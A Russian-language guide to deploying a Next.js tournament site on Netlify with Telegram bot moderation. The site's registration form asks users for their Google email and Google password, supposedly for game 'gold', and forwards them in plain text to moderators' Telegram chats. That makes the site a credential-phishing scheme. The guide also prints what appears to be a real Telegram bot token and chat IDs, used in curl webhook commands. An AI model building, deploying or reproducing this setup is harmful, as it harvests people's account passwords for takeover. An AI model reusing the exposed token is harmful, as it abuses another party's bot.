# 🌐 Деплой на Netlify

## 🎯 Почему Netlify?

- ✅ **Бесплатный план** - 100GB трафика в месяц
- ✅ **Простой деплой** из GitHub
- ✅ **Автоматические SSL** сертификаты
- ✅ **Отлично работает с Next.js**
- ✅ **Webhooks** поддерживаются
- ✅ **Переменные окружения** легко настроить

## 🚀 Пошаговая инструкция:

### 1. Подготовка проекта
```bash
git add .
git commit -m "Ready for Netlify deployment"
git push origin main
```

### 2. Создание проекта на Netlify
1. Зайдите на https://netlify.com
2. Нажмите "Sign up" → выберите GitHub
3. Нажмите "New site from Git"
4. Выберите "GitHub" как провайдера
5. Найдите ваш репозиторий `projectboltsb1ejghzr6g`
6. Нажмите "Deploy site"

### 3. Настройка сборки
В разделе "Site settings" → "Build & deploy" → "Build settings":

**Build command:**
```
npm run build
```

**Publish directory:**
```
.next
```

### 4. Настройка переменных окружения
В разделе "Site settings" → "Environment variables" добавьте:

**TELEGRAM_BOT_TOKEN:**
```
8300295855:AAERGiYguNtapixztzwKb2YYOKt4p6mxnaQ
```

**TELEGRAM_CHAT_ID:**
```
1035111558,5013646776
```

### 5. Получение URL проекта
После деплоя Netlify даст вам URL вида:
```
https://projectboltsb1ejghzr6g.netlify.app
```

### 6. Настройка Telegram webhook
Замените `ВАШ_URL` на ваш Netlify URL:

```bash
curl -X POST "https://api.telegram.org/bot8300295855:AAERGiYguNtapixztzwKb2YYOKt4p6mxnaQ/setWebhook" \
     -H "Content-Type: application/json" \
     -d '{"url": "https://ВАШ_URL.netlify.app/api/telegram-bot"}'
```

### 7. Проверка webhook
```bash
curl "https://api.telegram.org/bot8300295855:AAERGiYguNtapixztzwKb2YYOKt4p6mxnaQ/getWebhookInfo"
```

## 🧪 Тестирование:

1. **Откройте ваш сайт** на Netlify URL
2. **Нажмите "УЧАСТВОВАТЬ"** на любом турнире
3. **Заполните форму регистрации:**
   - Имя пользователя: `TestUser`
   - Google Email: `test@gmail.com`
   - Google Пароль: `test123`
4. **Проверьте Telegram** у модераторов

## 📱 Что увидят модераторы:

```
🆕 Новая регистрация на модерации!

👤 Пользователь: TestUser
🆔 User ID: user_1234567890_abc123

📱 Google аккаунт для голды:
📧 Email: test@gmail.com
🔐 Пароль: test123

━━━━━━━━━━━━━━━━━━━━
Выберите действие:

[✅ Одобрить] [❌ Отклонить]
[💬 Написать сообщение]
```

## 🔧 Netlify преимущества:

### По сравнению с Vercel:
- **Бесплатный план** - больше трафика
- **Простая настройка** - меньше конфигурации
- **Webhooks** - стабильная работа

### По сравнению с Railway:
- **Бесплатный план** - 100GB vs 5$ кредитов
- **Проще настройка** - меньше файлов конфигурации
- **Быстрее деплой** - оптимизирован для фронтенда

## 💰 Стоимость:

- **Бесплатный план:** 100GB трафика в месяц
- **Для вашего проекта:** хватит на долго
- **При превышении:** сайт остается работать, но с ограничениями

## 🆘 Если что-то не работает:

1. **Проверьте переменные окружения** в Netlify Dashboard
2. **Проверьте логи сборки** в разделе "Deploys"
3. **Проверьте webhook** командой getWebhookInfo
4. **Перезапустите деплой** в Netlify Dashboard

## ✅ Готово!

После деплоя на Netlify у вас будет:
- ✅ Рабочий сайт с турнирами
- ✅ Telegram бот модерация
- ✅ Интерактивные кнопки
- ✅ Система уведомлений
- ✅ Автоматический деплой из GitHub

**Netlify - отличный выбор для вашего проекта!** 🌐
